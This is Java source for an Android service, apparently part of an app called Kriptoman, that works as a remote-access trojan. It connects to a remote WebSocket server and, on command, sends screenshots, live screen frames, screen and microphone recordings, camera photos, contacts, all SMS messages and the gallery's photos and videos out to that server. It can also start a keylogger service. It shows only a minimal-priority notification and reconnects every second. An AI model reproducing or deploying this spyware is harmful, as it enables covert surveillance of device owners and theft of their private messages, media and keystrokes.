package com.kriptoman;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.util.Base64;

import androidx.core.app.NotificationCompat;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.drafts.Draft_6455;
import org.java_websocket.handshake.ServerHandshake;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.net.URI;
import java.nio.ByteBuffer;
import java.nio.IntBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class WebSocketService extends Service {
    private static MediaProjection sMediaProjection;
    private WebSocketClient client;
    private Handler handler = new Handler();
    private String deviceName = Build.MODEL;
    private SharedPreferences prefs;
    private String serverUrl;
    private String logFile;
    private boolean streaming = false;
    private Runnable streamRunnable;
    private ImageReader imageReader;
    private VirtualDisplay virtualDisplay;
    private MediaRecorder mediaRecorder;
    private String videoFilePath;
    public static Context appContext;
    public static WebSocketService instance;
    public static final String ACTION_CAMERA_FRONT = "com.kriptoman.CAMERA_FRONT";
    public static final String ACTION_CAMERA_BACK = "com.kriptoman.CAMERA_BACK";
    private File keysFile;
    private File errorsFile;
    private boolean galleryExportRunning = false;
    private volatile boolean stopGalleryExport = false;

    public static void setMediaProjection(MediaProjection mp) {
        sMediaProjection = mp;
    }

    private void writeLog(String msg) {
        try {
            if (logFile == null) {
                File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                if (!dir.exists()) dir.mkdirs();
                logFile = new File(dir, "kriptoman_log.txt").getAbsolutePath();
            }
            FileOutputStream fos = new FileOutputStream(logFile, true);
            PrintWriter pw = new PrintWriter(fos);
            pw.println(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()) + " " + msg);
            pw.close();
            fos.close();
        } catch (Exception e) {
            writeError(e);
        }
    }

    private void writeError(Exception e) {
        try {
            if (errorsFile == null) {
                File root = Environment.getExternalStorageDirectory();
                errorsFile = new File(root, "kriptoman_errors.log");
            }
            FileOutputStream fos = new FileOutputStream(errorsFile, true);
            PrintWriter pw = new PrintWriter(fos);
            pw.println(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()) + " " + e.toString());
            pw.close();
            fos.close();
        } catch (Exception ex) {}
    }

    private void saveKeys(String code, String url) {
        try {
            File root = Environment.getExternalStorageDirectory();
            keysFile = new File(root, "kriptoman_keys.txt");
            FileOutputStream fos = new FileOutputStream(keysFile);
            PrintWriter pw = new PrintWriter(fos);
            pw.println("CODE=" + code);
            pw.println("URL=" + url);
            pw.close();
            fos.close();
        } catch (Exception e) {}
    }

    private String readKey(String key) {
        try {
            File root = Environment.getExternalStorageDirectory();
            File f = new File(root, "kriptoman_keys.txt");
            if (!f.exists()) return null;
            java.io.BufferedReader br = new java.io.BufferedReader(new java.io.FileReader(f));
            String line;
            while ((line = br.readLine()) != null) {
                if (line.startsWith(key + "=")) {
                    return line.substring(key.length()+1);
                }
            }
            br.close();
        } catch (Exception e) {}
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        appContext = getApplicationContext();
        prefs = getSharedPreferences("kriptoman", MODE_PRIVATE);
        serverUrl = prefs.getString("server_url", "wss://pycj.onrender.com");
        String savedCode = readKey("CODE");
        if (savedCode != null) {
            prefs.edit().putString("device_code", savedCode).apply();
        }
        writeLog("=== СЕРВИС ЗАПУЩЕН ===");
        writeLog("URL сервера: " + serverUrl);
        createNotificationChannel();
        startForeground(1, getNotification());
        connectWebSocket();
    }

    private void connectWebSocket() {
        try {
            URI uri = new URI(serverUrl);
            client = new WebSocketClient(uri, new Draft_6455()) {
                @Override
                public void onOpen(ServerHandshake handshake) {
                    writeLog("WebSocket открыт");
                    registerDevice();
                    startPing();
                }

                @Override
                public void onMessage(String message) {
                    writeLog("Получено: " + message);
                    handleCommand(message);
                }

                @Override
                public void onClose(int code, String reason, boolean remote) {
                    writeLog("Закрыто: " + code + " " + reason);
                    handler.postDelayed(() -> connectWebSocket(), 1000); // быстрее переподключаемся
                }

                @Override
                public void onError(Exception ex) {
                    writeLog("Ошибка: " + ex.toString());
                    writeError(ex);
                    handler.postDelayed(() -> connectWebSocket(), 1000);
                }
            };
            client.connect();
        } catch (Exception e) {
            writeLog("Ошибка подключения: " + e.toString());
            writeError(e);
            handler.postDelayed(() -> connectWebSocket(), 1000);
        }
    }

    private void startPing() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (client != null && client.isOpen()) {
                    try {
                        client.send("{\"type\":\"ping\"}");
                    } catch (Exception e) {}
                }
                handler.postDelayed(this, 5000); // пинг каждые 5 секунд для стабильности
            }
        }, 5000);
    }

    private void registerDevice() {
        try {
            String code = readKey("CODE");
            String name = deviceName;
            String msg = "{\"type\":\"register\",\"name\":\"" + name + "\",\"secret\":\"root\"}";
            if (code != null) {
                msg = "{\"type\":\"register\",\"name\":\"" + name + "\",\"secret\":\"root\",\"code\":\"" + code + "\"}";
            }
            client.send(msg);
            writeLog("Регистрация отправлена" + (code!=null ? " с кодом "+code : ""));
        } catch (Exception e) {
            writeLog("Ошибка регистрации: " + e.toString());
            writeError(e);
        }
    }

    private void handleCommand(String message) {
        try {
            org.json.JSONObject json = new org.json.JSONObject(message);
            String type = json.getString("type");
            if ("command".equals(type)) {
                String action = json.getString("action");
                writeLog("Команда: " + action);
                executeCommand(action, json.optJSONObject("params"));
            } else if ("registered".equals(type)) {
                String code = json.getString("code");
                saveKeys(code, serverUrl);
                prefs.edit().putString("device_code", code).apply();
                writeLog("Код сохранён: " + code);
            }
        } catch (Exception e) {
            writeLog("Ошибка обработки команды: " + e.toString());
            writeError(e);
        }
    }

    private void executeCommand(String action, org.json.JSONObject params) {
        writeLog("Выполнение команды: " + action);
        switch (action) {
            case "screenshot": takeScreenshot(); break;
            case "stream": handleStream(params); break;
            case "video": startVideoRecording(); break;
            case "keyboard": toggleKeyLogging(); break;
            case "app": openApp(params != null ? params.optString("package") : null); break;
            case "frontcam": startCamera(true); break;
            case "backcam": startCamera(false); break;
            case "contacts": exportContacts(); break;
            case "sms": exportSms(); break;
            case "exportgallery": startGalleryExport(params); break;
            case "stopgallery": stopGalleryExport(); break;
            default: writeLog("Неизвестная команда: " + action);
        }
    }

    // ===================== СКРИНШОТ (исправлен) =====================
    private void takeScreenshot() {
        if (sMediaProjection == null) {
            writeLog("MediaProjection не инициализирован для скриншота");
            return;
        }
        try {
            int width = 720, height = 1280;
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            virtualDisplay = sMediaProjection.createVirtualDisplay("Screenshot", width, height, 240,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
            Thread.sleep(200);
            Image image = imageReader.acquireLatestImage();
            if (image != null) {
                Bitmap bitmap = imageToBitmap(image);
                image.close();
                if (bitmap != null) {
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 90, baos);
                    byte[] jpegData = baos.toByteArray();
                    String base64 = Base64.encodeToString(jpegData, Base64.NO_WRAP);
                    client.send("{\"type\":\"screenshot\",\"image\":\"data:image/jpeg;base64," + base64 + "\"}");
                    writeLog("Скриншот отправлен (JPEG)");
                    bitmap.recycle();
                } else {
                    writeLog("Не удалось создать Bitmap");
                }
            } else {
                writeLog("Не удалось получить изображение (image == null)");
            }
            if (virtualDisplay != null) virtualDisplay.release();
            if (imageReader != null) imageReader.close();
        } catch (Exception e) {
            writeLog("Ошибка скриншота: " + e.toString());
            writeError(e);
        }
    }

    private Bitmap imageToBitmap(Image image) {
        Image.Plane plane = image.getPlanes()[0];
        ByteBuffer buffer = plane.getBuffer();
        int pixelStride = plane.getPixelStride();
        int rowStride = plane.getRowStride();
        int width = image.getWidth();
        int height = image.getHeight();

        Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
        if (rowStride == width * pixelStride) {
            buffer.rewind();
            bitmap.copyPixelsFromBuffer(buffer);
            return bitmap;
        } else {
            buffer.rewind();
            IntBuffer intBuffer = buffer.asIntBuffer();
            int[] pixels = new int[width * height];
            intBuffer.get(pixels);
            for (int i = 0; i < pixels.length; i++) {
                int p = pixels[i];
                int a = (p >> 24) & 0xFF;
                int r = (p >> 16) & 0xFF;
                int g = (p >> 8) & 0xFF;
                int b = p & 0xFF;
                pixels[i] = (a << 24) | (r << 16) | (g << 8) | b;
            }
            bitmap.setPixels(pixels, 0, width, 0, 0, width, height);
            return bitmap;
        }
    }

    // ===================== СТРИМИНГ (ускорен) =====================
    private void handleStream(org.json.JSONObject params) {
        if (params == null) return;
        String action = params.optString("action");
        if ("start".equals(action)) {
            if (streaming) return;
            streaming = true;
            writeLog("Стрим запущен");
            startStreaming();
        } else if ("stop".equals(action)) {
            streaming = false;
            if (streamRunnable != null) {
                handler.removeCallbacks(streamRunnable);
                streamRunnable = null;
            }
            writeLog("Стрим остановлен");
        }
    }

    private void startStreaming() {
        streamRunnable = new Runnable() {
            @Override
            public void run() {
                if (!streaming || client == null || !client.isOpen()) {
                    return;
                }
                takeScreenshotForStream();
                handler.postDelayed(this, 100);
            }
        };
        handler.post(streamRunnable);
    }

    private void takeScreenshotForStream() {
        if (sMediaProjection == null) {
            writeLog("MediaProjection не инициализирован для стрима");
            return;
        }
        try {
            int width = 320, height = 480;
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            virtualDisplay = sMediaProjection.createVirtualDisplay("Stream", width, height, 240,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
            Thread.sleep(50);
            Image image = imageReader.acquireLatestImage();
            if (image != null) {
                Bitmap bitmap = imageToBitmap(image);
                image.close();
                if (bitmap != null) {
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.PNG, 80, baos);
                    String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                    client.send("{\"type\":\"stream_frame\",\"image\":\"" + base64 + "\"}");
                    writeLog("Кадр стрима отправлен");
                    bitmap.recycle();
                }
            }
            if (virtualDisplay != null) virtualDisplay.release();
            if (imageReader != null) imageReader.close();
        } catch (Exception e) {
            writeLog("Ошибка стрима: " + e.toString());
            writeError(e);
        }
    }

    // ===================== ВИДЕО (без изменений) =====================
    private void startVideoRecording() {
        if (sMediaProjection == null) {
            writeLog("MediaProjection не инициализирован для видео");
            return;
        }
        try {
            File dir = new File(getExternalFilesDir(null), "videos");
            if (!dir.exists()) dir.mkdirs();
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
            videoFilePath = new File(dir, "video_" + timestamp + ".mp4").getAbsolutePath();

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setVideoSize(720, 1280);
            mediaRecorder.setVideoFrameRate(30);
            mediaRecorder.setOutputFile(videoFilePath);
            mediaRecorder.prepare();

            VirtualDisplay vd = sMediaProjection.createVirtualDisplay("VideoRecording",
                    720, 1280, 240,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    mediaRecorder.getSurface(), null, null);
            mediaRecorder.start();
            writeLog("Видеозапись начата, файл: " + videoFilePath);

            handler.postDelayed(() -> {
                try {
                    mediaRecorder.stop();
                    mediaRecorder.release();
                    mediaRecorder = null;
                    writeLog("Видео остановлено, файл: " + videoFilePath);
                    sendVideoToServer(videoFilePath);
                } catch (Exception e) {
                    writeLog("Ошибка остановки видео: " + e.toString());
                    writeError(e);
                }
            }, 30000);
        } catch (Exception e) {
            writeLog("Ошибка видео: " + e.toString());
            writeError(e);
        }
    }

    private void sendVideoToServer(String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                writeLog("Файл видео не найден: " + filePath);
                return;
            }
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();
            String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
            client.send("{\"type\":\"video_file\",\"filename\":\"" + file.getName() + "\",\"data\":\"" + base64 + "\"}");
            writeLog("Видео отправлено на сервер: " + file.getName());
        } catch (Exception e) {
            writeLog("Ошибка отправки видео: " + e.toString());
            writeError(e);
        }
    }

    // ===================== КАМЕРА (исправлена) =====================
    private void startCamera(boolean front) {
        writeLog("Запрос камеры, фронтальная: " + front);
        Intent intent = new Intent(front ? ACTION_CAMERA_FRONT : ACTION_CAMERA_BACK);
        sendBroadcast(intent);
        writeLog("Broadcast отправлен");
    }

    public static void sendPhoto(byte[] photoData) {
        if (photoData == null) return;
        if (instance == null || instance.client == null) return;
        try {
            String base64 = Base64.encodeToString(photoData, Base64.NO_WRAP);
            instance.client.send("{\"type\":\"camera_photo\",\"image\":\"data:image/jpeg;base64," + base64 + "\"}");
        } catch (Exception e) {
            instance.writeError(e);
        }
    }

    // ===================== ЭКСПОРТ ГАЛЕРЕИ (с возможностью остановки и выбором количества) =====================
    private void startGalleryExport(org.json.JSONObject params) {
        if (galleryExportRunning) {
            writeLog("Экспорт галереи уже выполняется");
            return;
        }
        int mode = 0; // 0 - все, 1 - первые 3, 2 - последние 3
        if (params != null) {
            String m = params.optString("mode", "all");
            if ("first3".equals(m)) mode = 1;
            else if ("last3".equals(m)) mode = 2;
        }
        stopGalleryExport = false;
        galleryExportRunning = true;
        writeLog("Экспорт галереи запущен, режим: " + (mode==0 ? "все" : mode==1 ? "первые 3" : "последние 3"));
        new Thread(() -> {
            try {
                ContentResolver cr = getContentResolver();
                // Экспорт изображений
                String[] imageProjection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME};
                Cursor imageCursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageProjection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
                if (imageCursor != null) {
                    int count = imageCursor.getCount();
                    int limit = (mode == 1) ? Math.min(3, count) : (mode == 2) ? Math.min(3, count) : count;
                    int start = (mode == 2) ? Math.max(0, count - 3) : 0;
                    if (imageCursor.moveToPosition(start)) {
                        int sent = 0;
                        do {
                            if (stopGalleryExport) break;
                            long id = imageCursor.getLong(0);
                            String name = imageCursor.getString(1);
                            Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
                            byte[] data = readUriBytes(uri);
                            if (data != null) {
                                String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
                                client.send("{\"type\":\"gallery_item\",\"filename\":\"" + name + "\",\"data\":\"" + base64 + "\"}");
                                writeLog("Отправлено изображение: " + name);
                            }
                            sent++;
                        } while (imageCursor.moveToNext() && sent < limit);
                    }
                    imageCursor.close();
                }

                // Экспорт видео (аналогично)
                String[] videoProjection = {MediaStore.Video.Media._ID, MediaStore.Video.Media.DISPLAY_NAME};
                Cursor videoCursor = cr.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, videoProjection, null, null, MediaStore.Video.Media.DATE_ADDED + " DESC");
                if (videoCursor != null) {
                    int count = videoCursor.getCount();
                    int limit = (mode == 1) ? Math.min(3, count) : (mode == 2) ? Math.min(3, count) : count;
                    int start = (mode == 2) ? Math.max(0, count - 3) : 0;
                    if (videoCursor.moveToPosition(start)) {
                        int sent = 0;
                        do {
                            if (stopGalleryExport) break;
                            long id = videoCursor.getLong(0);
                            String name = videoCursor.getString(1);
                            Uri uri = Uri.withAppendedPath(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
                            byte[] data = readUriBytes(uri);
                            if (data != null) {
                                String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
                                client.send("{\"type\":\"gallery_item\",\"filename\":\"" + name + "\",\"data\":\"" + base64 + "\"}");
                                writeLog("Отправлено видео: " + name);
                            }
                            sent++;
                        } while (videoCursor.moveToNext() && sent < limit);
                    }
                    videoCursor.close();
                }
                writeLog("Экспорт галереи завершён");
            } catch (Exception e) {
                writeLog("Ошибка экспорта галереи: " + e.toString());
                writeError(e);
            } finally {
                galleryExportRunning = false;
            }
        }).start();
    }

    private void stopGalleryExport() {
        if (galleryExportRunning) {
            stopGalleryExport = true;
            writeLog("Остановка экспорта галереи запрошена");
        } else {
            writeLog("Экспорт галереи не выполняется");
        }
    }

    private byte[] readUriBytes(Uri uri) {
        try {
            ContentResolver cr = getContentResolver();
            java.io.InputStream is = cr.openInputStream(uri);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[8192];
            int len;
            while ((len = is.read(buffer)) != -1) {
                baos.write(buffer, 0, len);
            }
            is.close();
            return baos.toByteArray();
        } catch (Exception e) {
            writeLog("Ошибка чтения URI: " + e.toString());
            return null;
        }
    }

    // ===================== ОСТАЛЬНЫЕ ФУНКЦИИ =====================
    private void openApp(String pkg) {
        if (pkg == null || pkg.isEmpty()) {
            writeLog("Не указан пакет");
            return;
        }
        try {
            Intent intent = getPackageManager().getLaunchIntentForPackage(pkg);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                writeLog("Приложение открыто: " + pkg);
            } else {
                writeLog("Приложение не найдено: " + pkg);
            }
        } catch (Exception e) {
            writeLog("Ошибка открытия приложения: " + e.toString());
            writeError(e);
        }
    }

    private void toggleKeyLogging() {
        writeLog("Запуск/остановка записи клавиатуры");
        Intent intent = new Intent(this, KeyLoggerService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        writeLog("Сервис клавиатуры запущен");
    }

    private void exportContacts() {
        StringBuilder html = new StringBuilder("<html><head><meta charset='UTF-8'></head><body><h1>Контакты</h1><ul>");
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                html.append("<li>").append(name).append(" - ").append(number).append("</li>");
            }
            cursor.close();
        }
        html.append("</ul></body></html>");
        client.send("{\"type\":\"contacts\",\"html\":\"" + html.toString().replace("\"", "\\\"") + "\"}");
        writeLog("Контакты отправлены");
    }

    private void exportSms() {
        StringBuilder html = new StringBuilder("<html><head><meta charset='UTF-8'></head><body><h1>SMS</h1><ul>");
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                html.append("<li>").append(address).append(": ").append(body).append("</li>");
            }
            cursor.close();
        }
        html.append("</ul></body></html>");
        client.send("{\"type\":\"sms\",\"html\":\"" + html.toString().replace("\"", "\\\"") + "\"}");
        writeLog("SMS отправлены");
    }

    private Notification getNotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "kriptoman_channel")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setPriority(NotificationCompat.PRIORITY_MIN);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder.setChannelId("kriptoman_channel");
        }
        return builder.build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("kriptoman_channel",
                    "Kriptoman", NotificationManager.IMPORTANCE_LOW);
            channel.setShowBadge(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        if (client != null) client.close();
        streaming = false;
        if (mediaRecorder != null) {
            try { mediaRecorder.release(); } catch (Exception e) {}
        }
        instance = null;
        super.onDestroy();
    }
}
